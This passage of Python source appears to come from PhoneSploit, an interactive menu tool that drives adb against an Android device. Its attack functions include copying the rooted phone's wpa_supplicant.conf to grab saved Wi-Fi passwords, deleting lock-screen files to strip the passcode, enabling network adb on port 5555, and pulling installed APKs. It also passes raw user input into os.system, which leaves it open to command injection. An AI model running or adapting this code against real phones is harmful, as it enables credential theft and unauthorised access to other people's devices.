            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '15':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a package name. They look like this --> com.snapchat.android").format(Fore.RED, Fore.WHITE))
            package_name = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(app_run) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" shell monkey -p "+package_name+" -v 500")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '16':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a port on the device.").format(Fore.RED, Fore.WHITE))
            port_device = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
            print (("         "+connect))
            print (("        [{0}+{1}]Enter a port to forward it too.").format(Fore.RED, Fore.WHITE))
            forward_port = raw_input("        "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" forward tcp:"+port_device+" tcp:"+forward_port)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '17':
            try:
                print ((Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C").format(Fore.RED, Fore.WHITE))
                print (("     "+connect))
                print (("    [{0}+{1}]Enter where you want the file to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
                location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(wpa_grab) "+Fore.WHITE + "> ")
                os.system("adb -s "+device_name+" shell "+"su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
                os.system("adb -s "+device_name+" pull /sdcard/wpa_supplicant.conf "+location)
                option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

            except KeyboardInterrupt:
                option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '18':
            os.system("adb -s " +device_name+ " shell ip address show wlan0")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '19':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a package name. They look like this --> com.snapchat.android").format(Fore.RED, Fore.WHITE))
            package_name = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" shell pm path "+package_name)
            print (("         "+connect))
            print (("        [{0}+{1}]Enter The path.looks like this /data/app/com.snapchat.android-qWgDcBiCEvANq6op_NPqeA==/base.apk").format(Fore.RED, Fore.WHITE))
            path = raw_input("        "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
            print (("             "+connect))
            print (("            [{0}+{1}]Enter The location to store the apk: [Default: present working directory]")  .format(Fore.RED, Fore.WHITE))
            location =   raw_input("            "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
            os.system("adb -s " +device_name+" pull "+path+" "+location)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '20':
            os.system("adb -s " +device_name+ " shell dumpsys battery")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '21':
            os.system("adb -s " +device_name+ " shell netstat")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '22':
            print (("     "+connect))
            print (("    [{0}+{1}] To turn wifi back on you need the device to be pluged in.").format(Fore.RED, Fore.WHITE))
            print (("     "+connect))
            on_off = raw_input(Fore.WHITE + "    ["+Fore.RED+"+"+Fore.WHITE+"]Would you like the wifi "+Fore.GREEN +"on"+Fore.WHITE +"/"+Fore.RED +"off "+Fore.WHITE)
            if on_off == 'off':
                command = " shell svc wifi disable"
            else:
                command = " shell svc wifi enable"

            os.system("adb -s "+device_name+command)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '23':
            print ((Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C THIS IS ALSO UNTESTED").format(Fore.RED, Fore.WHITE))
            print (("     "+connect))
            print (Fore.RED + "******************TRYING TO REMOVE PASS******************")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
            print (Fore.RED + "******************TRYING TO REMOVE PASS******************")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '24':
            print ('''
    0 -->  "KEYCODE_UNKNOWN"
    1 -->  "KEYCODE_MENU"
    2 -->  "KEYCODE_SOFT_RIGHT"
    3 -->  "KEYCODE_HOME"
    4 -->  "KEYCODE_BACK"
    5 -->  "KEYCODE_CALL"
    6 -->  "KEYCODE_ENDCALL"
    7 -->  "KEYCODE_0"
    8 -->  "KEYCODE_1"
    9 -->  "KEYCODE_2"
    10 -->  "KEYCODE_3"
    11 -->  "KEYCODE_4"
    12 -->  "KEYCODE_5"
    13 -->  "KEYCODE_6"
    14 -->  "KEYCODE_7"
    15 -->  "KEYCODE_8"
    16 -->  "KEYCODE_9"
    17 -->  "KEYCODE_STAR"
    18 -->  "KEYCODE_POUND"
    19 -->  "KEYCODE_DPAD_UP"
    20 -->  "KEYCODE_DPAD_DOWN"
    21 -->  "KEYCODE_DPAD_LEFT"
    22 -->  "KEYCODE_DPAD_RIGHT"
    23 -->  "KEYCODE_DPAD_CENTER"
    24 -->  "KEYCODE_VOLUME_UP"
    25 -->  "KEYCODE_VOLUME_DOWN"
    26 -->  "KEYCODE_POWER"
    27 -->  "KEYCODE_CAMERA"
    28 -->  "KEYCODE_CLEAR"
    29 -->  "KEYCODE_A"
    30 -->  "KEYCODE_B"
    31 -->  "KEYCODE_C"
    32 -->  "KEYCODE_D"
    33 -->  "KEYCODE_E"
    34 -->  "KEYCODE_F"
    35 -->  "KEYCODE_G"
    36 -->  "KEYCODE_H"
    37 -->  "KEYCODE_I"
    38 -->  "KEYCODE_J"
    39 -->  "KEYCODE_K"
    40 -->  "KEYCODE_L"
    41 -->  "KEYCODE_M"
    42 -->  "KEYCODE_N"
    43 -->  "KEYCODE_O"
    44 -->  "KEYCODE_P"
    45 -->  "KEYCODE_Q"
    46 -->  "KEYCODE_R"
    47 -->  "KEYCODE_S"
    48 -->  "KEYCODE_T"
    49 -->  "KEYCODE_U"
    50 -->  "KEYCODE_V"
    51 -->  "KEYCODE_W"
    52 -->  "KEYCODE_X"
    53 -->  "KEYCODE_Y"
    54 -->  "KEYCODE_Z"
    55 -->  "KEYCODE_COMMA"
    56 -->  "KEYCODE_PERIOD"
    57 -->  "KEYCODE_ALT_LEFT"
    58 -->  "KEYCODE_ALT_RIGHT"
    59 -->  "KEYCODE_SHIFT_LEFT"
    60 -->  "KEYCODE_SHIFT_RIGHT"
    61 -->  "KEYCODE_TAB"
    62 -->  "KEYCODE_SPACE"
    63 -->  "KEYCODE_SYM"
    64 -->  "KEYCODE_EXPLORER"
    65 -->  "KEYCODE_ENVELOPE"
    66 -->  "KEYCODE_ENTER"
    67 -->  "KEYCODE_DEL"
    68 -->  "KEYCODE_GRAVE"
    69 -->  "KEYCODE_MINUS"
    70 -->  "KEYCODE_EQUALS"
    71 -->  "KEYCODE_LEFT_BRACKET"
    72 -->  "KEYCODE_RIGHT_BRACKET"
    73 -->  "KEYCODE_BACKSLASH"
    74 -->  "KEYCODE_SEMICOLON"
    75 -->  "KEYCODE_APOSTROPHE"
    76 -->  "KEYCODE_SLASH"
    77 -->  "KEYCODE_AT"
    78 -->  "KEYCODE_NUM"
    79 -->  "KEYCODE_HEADSETHOOK"
    80 -->  "KEYCODE_FOCUS"
    81 -->  "KEYCODE_PLUS"
    82 -->  "KEYCODE_MENU"
    83 -->  "KEYCODE_NOTIFICATION"
    84 -->  "KEYCODE_SEARCH"
    85 -->  "TAG_LAST_KEYCODE"
            ''')
            print (("[{0}+{1}]Enter a number.").format(Fore.RED, Fore.WHITE))
            num = raw_input(arrow + "phonesploit"+Fore.RED + "(keycode) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" shell input keyevent "+num)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '25':
            os.system("adb -s " +device_name+ " dumpsys activity")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '0':
            global page2
            if page2 == True:
                clear(page_2)
                option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
            else:
                clear(page_1)
                option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == 'p':
            os.system('clear')
            page2 = True
            banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4])
            print (Fore.RED + banner_title)
            print (page_2)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == 'b':
            os.system('clear')
            page2 = False
            banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4])
            print (Fore.RED + banner_title)
            print (page_1)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '99':
            exit()
            break
        else:
            os.system("error: invalid menu option")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")


    main()

#=============================

def clear(page):
    global page2
    os.system('clear')
    banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4])
    print (Fore.RED + banner_title)    
    print (page)



#=============================  
# Run
yn = raw_input(Fore.WHITE + "Have you already installed adb via command line "+Fore.GREEN + "Y"+Fore.WHITE+"/"+Fore.RED+"n "+Fore.WHITE)
if yn == "n":
    os.system("sudo apt install adb")
print (Fore.RED + "Starting  adb server..")
os.system("adb tcpip 5555")
t.sleep(4)
os.system('clear')
banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4])
print (Fore.RED + banner_title)
print (page_1)
main()
